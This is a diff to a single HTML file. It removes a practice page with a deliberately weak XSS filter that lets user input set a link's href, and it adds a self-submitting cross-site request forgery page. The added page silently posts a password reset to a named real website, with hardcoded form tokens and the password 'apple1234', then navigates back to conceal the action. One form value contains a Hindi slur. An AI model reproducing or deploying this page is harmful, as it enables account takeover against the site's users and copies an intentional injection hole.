@@ -1,109 +1,29 @@
-<!doctype html><html><head><style type="text/css" id="dcoder_stylesheet">#container
-{
-  border: 3px solid red;
-  width: 700px;
-  font-size: 100px;
-  text-align: center;
-  margin: auto;
-  border-radius: 100px;
-  font-family: serif;
-  animation: suhail;
-  animation-duration: 8s;
-  animation-iteration-count: infinite;
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action="https://soft.iandsbuildtech.com/User/ResetPassword.aspx" method="GET">
+        <input type="hidden" name="__VIEWSTATE" value="/wEPDwUJMzY1MDE0NTExZGQjKNujDZfuKcrFzhc6BJys+ky+CFHly6Rzlkx5R/aX6g==">
+        <input type="hidden" name="__EVENTVALIDATION" value="/wEdAAWX+NviDqj6jo7qrh6nUVOnP/LUVKqmx3/pUfgdB8ZFnOtXCKqv0twozsmI4Q9/z/NS9OotfewnwxpC5ynHQnS3k6Iexq3WN+728k88umZUnY+AJA1/ll78cVJ2aowVA7GNIGve6OZBnQVuAjd5E7H8">
+        <input type="hidden" name="ctl00$Body$TxtPwd" value="apple1234">
+        <input type="hidden" name="ctl00$Body$TxtCnfPswd" value="apple1234">
+        <input type="hidden" name="ctl00$Body$BtnReset" value="vivky madarchod">
+    </form>
 
-@keyframes suhail
-{
-  from
-{
-  width:900px;
-  color: yellow;
-}
+<script>
 
-to
-{
-  
-  width: 1000px;
-  color: blue;
-  font-family: monospace;
-  
-  
-}
+document.forms[0].submit()
+setTimeout(()=>{
 
-}
+    history.back()
+},1000)
 
+</script>
 
-#name
-{
-  color: blue;
-  border: 1px solid red;
-  font-family: monospace;
-  width: 250px;
-  height: 50px;
-  margin-left: 400px; 
-  text-align: center;
-}
-
-#name:hover
-{
-/*
-  color: blue;
-  border: 1px solid red;
-  background-color: none;
-  font-family: serif;
-  width: 250px;
-  height: 50px;
-  margin-left: 400px;
-  
-  */
-}</style></head> 
- <body> 
-  <div id="container">
-    FIND DOM BASES XSS ON HERE 
-  </div> 
-  <br> 
-  <br> 
-  <br> 
-  <hr> 
-  <br> 
-  <input type="text" maxlength="30" placeholder="Enter You're Name" id="name"> 
-  <button onclick="submit()">SUBMIT</button>
-
- 
-  <a id="x" href="Google.com"CLICK HERE </a> 
-
-
- 
-<script type="text/javascript" id="dcoder_script">function submit()
-{
-  
-  
- name = document.getElementById("name").value
- 
-if(name.length == 0)
-{
-  alert("Value Not To Be Empty")
-}
- 
-else
-{
-  x = /[<"']/ig;
-  
-  if(x.test(name))
-  {
-    alert("Hacking Detect (xss)")
-  }
-
-else
-{
-  
-  
- test = document.getElementById("x").href = name
-
- name = document.getElementById("name").value = ""
-
-}
-
-}
- 
-}</script></body></html>
+</body>
+</html>
